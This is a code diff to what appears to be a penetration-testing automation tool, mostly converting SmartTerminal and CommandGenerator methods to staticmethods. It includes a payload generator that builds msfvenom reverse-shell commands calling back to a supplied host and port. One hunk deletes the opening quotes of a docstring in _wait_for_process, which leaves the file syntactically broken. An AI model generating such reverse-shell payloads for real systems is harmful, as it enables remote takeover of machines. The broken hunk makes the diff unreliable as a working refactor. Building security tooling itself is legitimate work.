@@ -548,8 +548,9 @@ class SmartTerminal:
             self._sandbox_container_id = None
         return success
 
+    @staticmethod
     def _prepare_command(
-        self, command: str, shell: bool, skip_sanitization: bool
+        command: str, shell: bool, skip_sanitization: bool
     ) -> tuple[str, list[str]]:
         """Prepare command for execution: sanitize and split"""
         # SECURITY: Sanitize command before execution
@@ -594,7 +595,6 @@ class SmartTerminal:
     def _wait_for_process(
         self, process: subprocess.Popen, timeout: int, command_preview: str
     ) -> tuple[str, str, int, ExecutionStatus]:
-        """
         Wait for process completion with DEADLOCK PREVENTION.
         Uses explicit communication handling and process group cleanup.
         """
@@ -637,7 +637,8 @@ class SmartTerminal:
             self._terminate_process_group(process)
             return "", str(e), -1, ExecutionStatus.FAILED
 
-    def _terminate_process_group(self, process: subprocess.Popen) -> None:
+    @staticmethod
+    def _terminate_process_group(process: subprocess.Popen) -> None:
         """Terminate process and all children"""
         try:
             if platform.system() != "Windows":
@@ -774,7 +775,8 @@ class CommandGenerator:
 
         return cmd
 
-    def _sanitize_url(self, url: str) -> str:
+    @staticmethod
+    def _sanitize_url(url: str) -> str:
         """Sanitize URL to prevent command injection"""
         # Remove dangerous characters that could break shell commands
         dangerous_chars: list[str] = [
@@ -849,9 +851,8 @@ class CommandGenerator:
 
         return cmd
 
-    def generate_payload_command(
-        self, payload_type: str, lhost: str, lport: int
-    ) -> str:
+    @staticmethod
+    def generate_payload_command(payload_type: str, lhost: str, lport: int) -> str:
         """Generate payload generation command"""
         if payload_type == "reverse_shell":
             return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
@@ -866,7 +867,8 @@ class CommandGenerator:
         else:
             return f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw"
 
-    def optimize_command(self, command: str) -> str:
+    @staticmethod
+    def optimize_command(command: str) -> str:
         """Optimize command for better performance"""
         # Add timeouts
         if "curl" in command and "--connect-timeout" not in command:
